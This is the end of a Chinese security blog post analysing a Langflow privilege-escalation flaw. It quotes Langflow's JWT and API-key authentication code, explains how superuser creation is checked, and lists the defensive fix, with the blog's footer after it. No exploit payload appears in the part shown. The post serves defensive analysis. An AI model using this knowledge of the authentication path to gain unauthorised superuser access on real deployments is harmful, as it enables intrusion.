                <span class="token keyword">raise</span> typer<span class="token punctuation">.</span>Exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> typer<span class="token punctuation">.</span>Exit<span class="token punctuation">:</span>
            <span class="token keyword">raise</span>  <span class="token comment"># Re-raise typer.Exit without wrapping</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>  <span class="token comment"># noqa: BLE001</span>
            typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error: Authentication failed - </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token conversion-option punctuation">!s</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">raise</span> typer<span class="token punctuation">.</span>Exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">from</span> Non</code></pre>

<p>如果没有开启自动登录，则需要提供一个<code>--auth-token</code>来创建超级用户</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">get_current_user_by_jwt</span><span class="token punctuation">(</span>
    token<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
    db<span class="token punctuation">:</span> AsyncSession<span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> User<span class="token punctuation">:</span>
    settings_service <span class="token operator">=</span> get_settings_service<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> Coroutine<span class="token punctuation">)</span><span class="token punctuation">:</span>
        token <span class="token operator">=</span> <span class="token keyword">await</span> token

    secret_key <span class="token operator">=</span> settings_service<span class="token punctuation">.</span>auth_settings<span class="token punctuation">.</span>SECRET_KEY<span class="token punctuation">.</span>get_secret_value<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> secret_key <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        logger<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"Secret key is not set in settings."</span><span class="token punctuation">)</span>
        <span class="token keyword">raise</span> HTTPException<span class="token punctuation">(</span>
            status_code<span class="token operator">=</span>status<span class="token punctuation">.</span>HTTP_401_UNAUTHORIZED<span class="token punctuation">,</span>
            <span class="token comment"># Careful not to leak sensitive information</span>
            detail<span class="token operator">=</span><span class="token string">"Authentication failure: Verify authentication settings."</span><span class="token punctuation">,</span>
            headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"WWW-Authenticate"</span><span class="token punctuation">:</span> <span class="token string">"Bearer"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> warnings<span class="token punctuation">.</span>catch_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            warnings<span class="token punctuation">.</span>simplefilter<span class="token punctuation">(</span><span class="token string">"ignore"</span><span class="token punctuation">)</span>
            payload <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret_key<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span>settings_service<span class="token punctuation">.</span>auth_settings<span class="token punctuation">.</span>ALGORITHM<span class="token punctuation">]</span><span class="token punctuation">)</span>
        user_id<span class="token punctuation">:</span> UUID <span class="token operator">=</span> payload<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sub"</span><span class="token punctuation">)</span>  <span class="token comment"># type: ignore[assignment]</span>
        token_type<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> payload<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"type"</span><span class="token punctuation">)</span>  <span class="token comment"># type: ignore[assignment]</span>
        <span class="token keyword">if</span> expires <span class="token operator">:=</span> payload<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"exp"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            expires_datetime <span class="token operator">=</span> datetime<span class="token punctuation">.</span>fromtimestamp<span class="token punctuation">(</span>expires<span class="token punctuation">,</span> timezone<span class="token punctuation">.</span>utc<span class="token punctuation">)</span>
            <span class="token keyword">if</span> datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span>timezone<span class="token punctuation">.</span>utc<span class="token punctuation">)</span> <span class="token operator">></span> expires_datetime<span class="token punctuation">:</span>
                logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Token expired for user"</span><span class="token punctuation">)</span>
                <span class="token keyword">raise</span> HTTPException<span class="token punctuation">(</span>
                    status_code<span class="token operator">=</span>status<span class="token punctuation">.</span>HTTP_401_UNAUTHORIZED<span class="token punctuation">,</span>
                    detail<span class="token operator">=</span><span class="token string">"Token has expired."</span><span class="token punctuation">,</span>
                    headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"WWW-Authenticate"</span><span class="token punctuation">:</span> <span class="token string">"Bearer"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span></code></pre>

<p>首先把这个token当作jwt解码，可以看到jwt加密的密钥就是环境变量提供的<code>LANGFLOW_SECRET_KEY</code>,加密算法是<code>HS256</code>,解JWT得到<code>user id</code>再查数据库得到用户名。</p>
<p>解码失败就当作<code>API Key</code>去数据库查找，如果有<code>is_superuser</code>属性则认证成功，允许创建超级用户。</p>
<p>防御策略就是</p>
<pre class="language-none"><code class="language-none">1.开启LANGFLOW_AUTO_LOGIN之后不准使用superuser创建超级用户
2.关闭LANGFLOW_AUTO_LOGIN，则需要提供一个有效token来进行权限验证，认证通过则允许创建超级用户。</code></pre>

<p>感觉密钥长度是一个安全隐患。</p>
</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://ta0.fun/posts/31287ede/" title="Langflow权限提升漏洞">http://ta0.fun/posts/31287ede/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/10540780/" rel="prev" title="MAZESEC-Ronos"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">MAZESEC-Ronos</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/f02bb322/" rel="next" title="用友U8 Cloud IPFxxFileService 文件上传限制不当漏洞"><span class="post-nav-text">用友U8 Cloud IPFxxFileService 文件上传限制不当漏洞</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>